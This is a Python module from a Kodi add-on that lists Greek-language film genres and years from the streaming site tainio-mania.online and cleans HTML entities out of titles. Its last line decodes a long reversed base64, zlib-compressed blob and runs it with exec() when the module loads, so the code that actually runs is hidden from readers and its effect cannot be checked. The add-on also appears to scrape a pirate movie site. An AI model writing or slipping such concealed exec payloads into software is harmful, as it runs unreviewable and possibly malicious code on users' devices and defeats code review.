
import re, xbmc, xbmcgui, xbmcaddon, six, base64, requests
from six import ensure_text
from six.moves.urllib_parse import quote_plus, parse_qs, urlencode
from resources.lib.modules import client, control, views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir

ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
TAINIOMANIA = 'https://tainio-mania.online/'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'
page = '[B][COLOR=lime]Επόμενη σελίδα >>[/COLOR][/B]'
no_name = '[COLOR lime] * [COLOR orange]Δεν υπάρχει διαθέσιμο Link [COLOR lime]*[/COLOR]'
lan = '[COLOR=gray]Γλώσσα:[/COLOR]'
sub_en = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_ell = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_no = ' |[COLOR=lime] Χωρίς Υπότιτλους[/COLOR]'

def Tainiomania_menu(): #84
    addDir('[B][COLOR coral]2025[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2025-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2024[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2024-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2023[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2023-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έτος[/COLOR][/B]', '', 86, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κατηγορίες[/COLOR][/B]', '', 87, ART + 'tainiomania.png', FANART, '')
#    addDir('[B][COLOR coral]Top 250 Movies[/COLOR][/B]', 'https://tainio-mania.online/load/top_250_movies/', 89, ART + 'tainiomania.png', FANART, '')

def menu_genre(): #87
    addDir('[B][COLOR coral]Ελλ-ταινίες[/COLOR][/B]', TAINIOMANIA + 'load/ellhnik_tain_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κωμωδίες[/COLOR][/B]', TAINIOMANIA + 'load/komodia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράμα[/COLOR][/B]', TAINIOMANIA + 'load/drama/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αισθηματικές[/COLOR][/B]', TAINIOMANIA + 'load/aisthhmatik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Οικογενειακές[/COLOR][/B]', TAINIOMANIA + 'load/oikogeneiak/', 89, ART + 'tainiomania.png', FANART, '')
#    addDir('[B][COLOR coral]Χριστουγιεννιάτικες[/COLOR][/B]', TAINIOMANIA + 'collections/2-hristoygenniatikes-tainies-online', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μεταγλωτισμένα Παιδικά[/COLOR][/B]', TAINIOMANIA + 'load/metaglwtismena-paidika-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κινούμενα Σχέδια[/COLOR][/B]', TAINIOMANIA + 'load/kino_mena_sch_dia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Animation[/COLOR][/B]', TAINIOMANIA + 'xfsearch/genre/Animation/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράση[/COLOR][/B]', TAINIOMANIA + 'load/dr_sh/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έγκλημα[/COLOR][/B]', TAINIOMANIA + 'load/egkl_mato/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Περιπέτεια[/COLOR][/B]', TAINIOMANIA + 'load/perip_teia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Πολέμου[/COLOR][/B]', TAINIOMANIA + 'load/polemik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ιστορικές[/COLOR][/B]', TAINIOMANIA + 'load/istorik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Τρόμου[/COLOR][/B]', TAINIOMANIA + 'load/tr_moy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μυστήριο[/COLOR][/B]', TAINIOMANIA + 'load/mysthr_oy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θρίλερ[/COLOR][/B]', TAINIOMANIA + 'load/thr_ler/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Φαντασίας[/COLOR][/B]', TAINIOMANIA + 'load/fantas_a/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ντοκιμαντέρ[/COLOR][/B]', TAINIOMANIA + 'load/ntokimant_r/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Βιογραφίες[/COLOR][/B]', TAINIOMANIA + 'load/biograf_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μιούζικαλ[/COLOR][/B]', TAINIOMANIA + 'load/mio_zikal/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αθλητικά[/COLOR][/B]', TAINIOMANIA + 'load/athlhtik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θέατρο[/COLOR][/B]', TAINIOMANIA + 'load/th_atro/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μουσική[/COLOR][/B]', TAINIOMANIA + 'load/moysik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/seir/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ολοκληρωμένες Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/oloklhrwmenes_seires/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Γουέστερν[/COLOR][/B]', TAINIOMANIA + 'load/goy_stern_western/', 89, ART + 'tainiomania.png', FANART, '')

def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n',
                                                                                                               ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

